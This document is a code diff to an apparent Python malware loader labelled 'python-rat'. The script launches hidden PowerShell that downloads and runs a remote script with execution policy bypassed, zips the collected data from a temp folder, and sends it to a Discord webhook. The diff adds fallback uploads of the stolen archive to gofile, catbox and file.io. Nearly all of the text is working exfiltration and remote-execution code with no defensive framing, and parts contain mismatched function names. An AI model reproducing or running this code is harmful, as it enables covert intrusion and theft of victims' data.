@@ -550,6 +550,10 @@ import string
 import requests
 import io
 
+# Helper function to handle errors
+def error_handler(e):
+    print(f"Error: {str(e)}")
+
 def run_powershell_script(url):
     command = f'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {{iwr -Uri \'{url}\' -UseBasicParsing | iex}}"'
     subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -562,13 +566,56 @@ def zip_folder(folder_path, password, zip_name):
                 full_path = os.path.join(root, file)
                 relative_path = os.path.relpath(full_path, folder_path)
                 zip_file.write(full_path, relative_path)
-    return zip_buffer.getvalue()
+    return zip_buffer.getvalue(), len(zip_buffer.getvalue())
 
-def send_to_discord(webhook_url, zip_data, filename, content):
-    files = {'file': (filename, zip_data)}
-    data = {'content': content}
-    response = requests.post(webhook_url, files=files, data=data)
-    return response.status_code
+def gofileupload(path):
+    try:
+        data = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
+        return data
+    except Exception as e:
+        error_Handler(e)
+        try:
+            try:
+                gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
+            except Exception as e:
+                error_Handler(e)
+                gofileserver = "store4"
+            r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+            return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
+        except Exception as e:
+            error_Handler(e)
+            return False
+
+def catboxmoeupload(path, request_type='upload'):
+    try:
+        with open(path, 'rb') as file:
+            data = {
+    'reqtype': 'fileupload',
+    'userhash': '',
+}
+            files = {'fileToUpload': (file.name, file, 'application/octet-stream')}
+            response = requests.post(f'https://catbox.moe/user/api.php?request_type={request_type}', files=files, data=data)
+            return response.content.decode()
+    except Exception as e:
+        return False
+
+
+def fileioupload(path):
+    try:
+        with open(path, 'rb') as file:
+            response = requests.post('https://file.io/', files={'file': file})
+        return response.json()["link"]
+    except Exception as e:
+        return False
+
+
+def upload_file(path):
+    link = gofileupload(path)
+    if not link:
+        link = catboxmoeupload(path)
+    if not link:
+        link = fileioupload(path)
+    return link
 
 # Step 1: Run the PowerShell script
 ps_script_url = "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1"
@@ -579,17 +626,32 @@ password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
 
 # Step 3: Zip the folder with the password
 temp_folder = os.path.join(os.getenv('TEMP'), 'loader')
-zip_data = zip_folder(temp_folder, password, 'Power_rat_data.zip')
+zip_data, zip_size = zip_folder(temp_folder, password, 'Power_rat_data.zip')
+
+# Check if the zip file exceeds 20 MB
+if zip_size > 20 * 1024 * 1024:  # 20 MB in bytes
+    zip_path = os.path.join(temp_folder, 'Power_rat_data.zip')
+    with open(zip_path, 'wb') as f:
+        f.write(zip_data)
+    link = upload_file(zip_path)
+else:
+    link = None
 
 # Step 4: Prepare the content and filename
 content = f"hai1723 on top\npassword:{password}"
 filename = "Power_rat_data.zip"
 
-# Step 5: Send the zipped file via Discord webhook
+# Step 5: Send the zipped file or link via Discord webhook
 webhook_url = "YOUR_WEBHOOK_URL"
-status = send_to_discord(webhook_url, zip_data, filename, content)
+if link:
+    content += f"\nDownload link: {link}"
+    response = requests.post(webhook_url, data={'content': content})
+else:
+    files = {'file': (filename, zip_data)}
+    data = {'content': content}
+    response = requests.post(webhook_url, files=files, data=data)
 
-if status == 200:
+if response.status_code == 200:
     print("File sent successfully.")
 else:
-    print(f"Failed to send file. Status code: {status}")
+    print(f"Failed to send file. Status code: {response.status_code}")
